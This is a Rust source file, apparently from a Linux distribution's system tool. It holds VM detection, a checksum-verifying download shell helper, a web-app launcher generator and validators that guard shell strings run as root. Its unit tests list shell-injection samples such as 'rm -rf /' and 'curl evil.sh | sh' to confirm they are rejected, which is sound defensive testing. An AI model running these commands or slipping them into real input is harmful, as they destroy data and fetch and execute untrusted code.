use std::fs;
use std::process::Command;

/// Detects whether the process is running inside a virtual machine.
///
/// WebKitGTK's DMA-BUF renderer can fail silently on virtual GPUs (VMware,
/// VirtualBox, QEMU/KVM, Hyper-V), leaving the window blank with no error.
/// Callers use this to decide whether to force `WEBKIT_DISABLE_DMABUF_RENDERER=1`.
pub fn is_running_in_vm() -> bool {
    if detect_virt_via_dmi() {
        return true;
    }
    detect_virt_via_systemd()
}

fn detect_virt_via_dmi() -> bool {
    const NEEDLES: [&str; 6] = ["vmware", "virtualbox", "qemu", "kvm", "xen", "innotek"];

    for path in [
        "/sys/class/dmi/id/sys_vendor",
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/bios_vendor",
    ] {
        if let Ok(content) = fs::read_to_string(path) {
            let content = content.to_lowercase();
            if NEEDLES.iter().any(|needle| content.contains(needle)) {
                return true;
            }
        }
    }
    false
}

fn detect_virt_via_systemd() -> bool {
    Command::new("systemd-detect-virt")
        .output()
        .map(|output| output.status.success())
        .unwrap_or(false)
}

// === Optional checksum verification for third-party downloads (security
// plan point 9) ===
//
// Most of these downloads point at a "latest version" URL that changes
// every release, so a hash can't be pinned in the Rust source without
// breaking the install the next time the upstream project ships a new
// version. Instead, this shell function probes for a same-name ".sha256"
// file next to the download — the convention several GitHub/GitLab release
// pages actually follow — and verifies against it when present. When the
// provider doesn't publish one, it downloads unverified exactly as before;
// this never turns a working install into a broken one, it only adds real
// verification where the upstream project already offers the means to.
pub const VERIFY_DOWNLOAD_SH: &str = r#"verify_and_download() {
  local url="$1" dest="$2"
  wget -q -O "$dest" "$url"
  # Most providers 404 the ".sha256" probe (no per-file checksum published),
  # and wget exits non-zero on that — which silently kills any caller that
  # runs under `set -e` (e.g. install_vbox_extpack) before the presence
  # check below even runs. The probe missing is an expected, handled case,
  # not a real failure, so it must not be allowed to abort the script.
  wget -q -O "$dest.sha256" "$url.sha256" 2>/dev/null || true
  # Some providers (e.g. GitLab's package_files download proxy) don't 404 an
  # unknown ".sha256" suffix — they just re-serve the original file, so a
  # multi-megabyte binary can land here looking like a "checksum". A real
  # checksum file is a handful of bytes: a 64-char hex hash, optionally
  # followed by a filename. Reject anything bigger or not shaped like one
  # before trusting it, instead of just checking it's non-empty.
  if [ -s "$dest.sha256" ] && [ "$(wc -c < "$dest.sha256")" -le 1024 ] && grep -qE "^[0-9a-fA-F]{64}" "$dest.sha256"; then
    if ! (cd "$(dirname "$dest")" && echo "$(awk '{print $1}' "$dest.sha256")  $(basename "$dest")" | sha256sum -c - >/dev/null 2>&1); then
      echo "Checksum verification failed for $(basename "$dest") — aborting."
      rm -f "$dest" "$dest.sha256"
      exit 1
    fi
  fi
  rm -f "$dest.sha256"
  # GitHub releases often publish one SHA256SUMS.txt for every asset instead
  # of a .sha256 per file (the ArtCraft suite does). When the release has it
  # and it names this file, the download must match it.
  case "$url" in
    https://github.com/*/releases/download/*)
      local sums="$dest.sums" name
      name="$(basename "$url")"
      if wget -q -O "$sums" "$(dirname "$url")/SHA256SUMS.txt" 2>/dev/null && [ "$(wc -c < "$sums")" -le 1048576 ] \
          && grep -qE "^[0-9a-fA-F]{64}[[:space:]]+\*?$name\$" "$sums"; then
        local expected
        expected="$(grep -E "^[0-9a-fA-F]{64}[[:space:]]+\*?$name\$" "$sums" | head -n 1 | awk '{print $1}')"
        if [ "$(sha256sum "$dest" | awk '{print $1}')" != "$expected" ]; then
          echo "Checksum verification failed for $name — aborting."
          rm -f "$dest" "$sums"
          exit 1
        fi
        echo "Checksum of $name verified."
      fi
      rm -f "$sums"
      ;;
  esac
}
"#;

// Ported from 2.x's recommended_tab.py _build_webapp_install_command /
// gaming_tab.py, which both shared the same browser-detection + .desktop
// logic for "Soplos WebApp" entries (a site pinned as its own app window,
// used e.g. for WhatsApp instead of an untrusted third-party Electron
// client). Takes 4-5 args: id, url, display name, absolute icon path, and
// an optional freedesktop category (defaults to Network). Chromium-family
// browsers get real app-mode (--app=, own taskbar identity via
// --class/--wayland-app-id); Firefox gets its own profile via -profile;
// with neither installed, falls back to a plain xdg-open link.
pub const WEBAPP_INSTALL_SH: &str = r#"install_soplos_webapp() {
  local wid="$1" url="$2" name="$3" icon="$4" category="${5:-Network}"
  local profile="$HOME/.local/share/soplos-webapps/$wid"
  mkdir -p "$profile"
  mkdir -p "$HOME/.local/share/applications"

  local exec_line="" startup_class="soplos-webapp-$wid"
  for b in chromium chromium-browser brave-browser google-chrome vivaldi; do
    if command -v "$b" >/dev/null 2>&1; then
      exec_line="env CHROME_DESKTOP=soplos-webapp-$wid.desktop $b --ozone-platform-hint=auto --wayland-app-id=soplos-webapp-$wid --class=soplos-webapp-$wid --name=soplos-webapp-$wid --wm-class=soplos-webapp-$wid --user-data-dir=$profile --app=$url"
      startup_class="chrome-$(echo "$url" | sed 's|https\?://||;s|/.*||')__-Default"
      break
    fi
  done
  if [ -z "$exec_line" ] && flatpak info org.chromium.Chromium >/dev/null 2>&1; then
    exec_line="env CHROME_DESKTOP=soplos-webapp-$wid.desktop flatpak run org.chromium.Chromium --ozone-platform-hint=auto --wayland-app-id=soplos-webapp-$wid --class=soplos-webapp-$wid --name=soplos-webapp-$wid --wm-class=soplos-webapp-$wid --user-data-dir=$profile --app=$url"
    startup_class="chrome-$(echo "$url" | sed 's|https\?://||;s|/.*||')__-Default"
  elif [ -z "$exec_line" ] && command -v firefox >/dev/null 2>&1; then
    exec_line="env MOZ_APP_REMOTINGNAME=soplos-webapp-$wid firefox -no-remote -new-instance -profile $profile -class soplos-webapp-$wid -name soplos-webapp-$wid $url"
  elif [ -z "$exec_line" ] && flatpak info org.mozilla.firefox >/dev/null 2>&1; then
    exec_line="env MOZ_APP_REMOTINGNAME=soplos-webapp-$wid flatpak run org.mozilla.firefox -no-remote -new-instance -profile $profile -class soplos-webapp-$wid -name soplos-webapp-$wid $url"
  else
    exec_line="xdg-open $url"
  fi

  cat > "$HOME/.local/share/applications/soplos-webapp-$wid.desktop" << DESKTOP
[Desktop Entry]
Version=1.0
Name=$name
Comment=Soplos WebApp for $name
Exec=$exec_line
Terminal=false
X-MultipleArgs=false
Type=Application
Icon=$icon
Categories=$category;
StartupWMClass=$startup_class
StartupNotify=true
X-Soplos-Navbar=false
X-Soplos-ExtraParams=
X-Soplos-Incognito=false
DESKTOP

  update-desktop-database "$HOME/.local/share/applications" 2>/dev/null || true
}
"#;

// === Shell-safety validators (security plan point 3) ===
//
// Several commands interpolate a frontend-supplied string into a shell
// script run as root via pkexec. Today every caller only ever passes values
// that already came from a trusted source (dpkg/apt-cache output), so none
// of this is exploitable in practice — but the functions themselves never
// checked that, so a future caller passing free-text would have been able
// to inject arbitrary shell commands. These validators close that gap at
// the point of use, independent of how well-behaved the current callers are.

/// A single Debian package name: lowercase letters, digits, '+', '-', '.'.
pub fn is_valid_pkg_name(s: &str) -> bool {
    !s.is_empty() && s.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '+' | '-' | '.'))
}

/// A space-separated list of package names (e.g. "gamemode libgamemode0").
pub fn is_valid_pkg_list(s: &str) -> bool {
    let s = s.trim();
    !s.is_empty() && s.split_whitespace().all(is_valid_pkg_name)
}

/// A Flatpak/reverse-DNS app id (e.g. "com.valvesoftware.Steam"): letters,
/// digits, '.', '-', '_'.
pub fn is_valid_flatpak_id(s: &str) -> bool {
    !s.is_empty() && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_'))
}

/// A short identifier such as a driver name, network interface, CUDA
/// version tag or ROCm mode: letters, digits, '_', '-'.
pub fn is_valid_identifier(s: &str) -> bool {
    !s.is_empty() && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-'))
}

/// A plain HTTPS URL safe to interpolate inside double quotes in a shell
/// script: no quotes, backticks, '$' or other characters bash would expand
/// or use to break out of the string.
pub fn is_valid_https_url(s: &str) -> bool {
    s.starts_with("https://")
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, ':' | '/' | '.' | '-' | '_' | '?' | '=' | '&' | '%' | '~' | '+'))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn pkg_name_accepts_real_debian_names() {
        assert!(is_valid_pkg_name("firefox"));
        assert!(is_valid_pkg_name("linux-image-7.2.6-soplos-bore-v3"));
        assert!(is_valid_pkg_name("libc6++"));
    }

    #[test]
    fn pkg_name_rejects_shell_injection() {
        assert!(!is_valid_pkg_name(""));
        assert!(!is_valid_pkg_name("firefox; rm -rf /"));
        assert!(!is_valid_pkg_name("firefox && curl evil.sh | sh"));
        assert!(!is_valid_pkg_name("firefox `whoami`"));
        assert!(!is_valid_pkg_name("firefox $(whoami)"));
        assert!(!is_valid_pkg_name("Firefox")); // uppercase not a real dpkg name
    }

    #[test]
    fn pkg_list_accepts_space_separated_names_only() {
        assert!(is_valid_pkg_list("gamemode libgamemode0"));
        assert!(!is_valid_pkg_list(""));
        assert!(!is_valid_pkg_list("gamemode; rm -rf /"));
    }

    #[test]
    fn flatpak_id_accepts_reverse_dns_rejects_injection() {
        assert!(is_valid_flatpak_id("com.valvesoftware.Steam"));
        assert!(!is_valid_flatpak_id("com.valvesoftware.Steam; rm -rf /"));
        assert!(!is_valid_flatpak_id(""));
    }

    #[test]
    fn identifier_accepts_driver_names_rejects_injection() {
        assert!(is_valid_identifier("iwlwifi"));
        assert!(is_valid_identifier("wlan0"));
        assert!(!is_valid_identifier("wlan0; rm -rf /"));
        assert!(!is_valid_identifier(""));
    }

    #[test]
    fn https_url_rejects_quote_and_shell_breakout() {
        assert!(is_valid_https_url("https://example.com/file.deb"));
        assert!(!is_valid_https_url("http://example.com/file.deb")); // not https
        assert!(!is_valid_https_url("https://example.com/\"; rm -rf /; echo \""));
        assert!(!is_valid_https_url("https://example.com/$(whoami)"));
    }
}
